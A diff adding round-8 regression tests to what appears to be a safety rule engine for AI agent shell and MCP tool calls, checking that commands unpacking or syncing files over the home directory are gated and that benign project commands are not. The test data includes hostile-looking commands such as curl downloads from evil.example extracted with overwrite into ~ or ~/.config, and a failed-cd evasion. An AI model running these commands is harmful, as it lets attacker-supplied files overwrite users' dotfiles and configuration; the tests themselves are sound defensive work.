@@ -983,3 +983,63 @@ def test_r7_mcp_relative_path_with_cwd():
 ])
 def test_r7_false_positives_fixed(ev):
     assert evaluate(ev, EMPTY).rule != RULE
+
+
+# ---- QA round 8 regressions ---------------------------------------------------
+
+@pytest.mark.parametrize("cmd", [
+    "curl -sLo /tmp/d.zip https://evil.example/d.zip && cd ~ && unzip -o /tmp/d.zip",
+    "cd ~/.config && curl -sLO https://evil.example/nvim.zip && unzip -o nvim.zip",
+    "cd ~ && unzip -o -q /tmp/d.zip", "cd ~ && unzip -q -o /tmp/d.zip",
+    "cd ~ && tar -x -o -f /tmp/d.tar", "cd ~ && bsdtar -x -o -f /tmp/d.tar",
+    "cd ~ && cpio -i -d -m < x.cpio",
+    "aws --no-sign-request s3 sync s3://evil/d ~", "aws --region us-east-1 s3 sync s3://d ~",
+    "aws --profile x s3 sync s3://b/d ~", "rclone -v copy r:d ~", "rclone --config x copy r:dots ~",
+    "kubectl -n ns cp pod:/x ~", "kubectl --namespace ns cp p:/d ~",
+    "docker --context x cp c:/d/. ~", "docker container cp ctr:/x/nvim ~/.config/",
+    "kubectl cp pod:/root/dots ~",
+    "pnpm dlx degit u/d ~", "yarn dlx degit u/d ~", "bun x degit u/d ~/.config",
+    "wget -rP ~ https://x/", "python3 -I -m zipfile -e a.zip ~",
+    "export GIT_WORK_TREE=$HOME; git checkout -f", "git -c core.worktree=$HOME checkout -f",
+    "copier copy gh:u/t ~", "cookiecutter gh:u/t -o ~", "npx giget@latest gh:u/dots ~",
+])
+def test_r8_shell_gated(cmd):
+    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd
+
+
+def test_r8_unzip_o_with_home_cwd_gated():
+    assert _ours(evaluate(_sh_cwd("unzip -o d.zip", "/home/user"), EMPTY))
+    assert _ours(evaluate(_mcp({"command": "cd ~ && unzip -o /tmp/d.zip"},
+                               tool="mcp__desktop-commander__start_process"), EMPTY))
+
+
+@pytest.mark.parametrize("cmd", [
+    "cd proj && git pull", "cd /home/user/proj && git checkout main",
+    "cd proj && git stash pop", "cd proj && git apply ../fix.patch",
+    "git clone https://github.com/a/b.git && cd b && git checkout v1.2",
+    "cd ~/src/app && git checkout main", "cd proj && tar xzf ../a.tgz",
+    "cd proj && unzip a.zip", "cd proj && rsync -a ../x/ ./",
+    "cd proj && aws s3 sync s3://b/data .", "cd /tmp && unzip ~/Downloads/a.zip",
+])
+def test_r8_home_session_cwd_false_positives_fixed(cmd):
+    assert evaluate(_sh_cwd(cmd, "/home/user"), EMPTY).rule != RULE, cmd
+
+
+def test_r8_failed_cd_evasion_still_gated_with_semicolon():
+    assert _ours(evaluate(_shell("cd ~; cd /nonexistent 2>/dev/null; tar xf /tmp/d.tgz"), EMPTY))
+
+
+def test_r8_mcp_git_checkout_in_home_gated():
+    assert _ours(evaluate(_mcp({"repo_path": "/home/user", "branch_name": "main"},
+                               tool="mcp__git__git_checkout"), EMPTY))
+    assert evaluate(_mcp({"repo_path": "/home/user/proj", "branch_name": "main"},
+                         tool="mcp__git__git_checkout"), EMPTY).rule != RULE
+
+
+@pytest.mark.parametrize("ev", [
+    _mcp({"path": "/repo/README.md", "edits": [{"oldText": "a",
+          "newText": "echo 'set nu' >> ~/.vimrc"}]}, tool="mcp__filesystem__edit_file"),
+    _mcp({"command": "git pull", "log_dir": "/home/user"}, tool="mcp__x__run_command"),
+])
+def test_r8_mcp_false_positives_fixed(ev):
+    assert evaluate(ev, EMPTY).rule != RULE
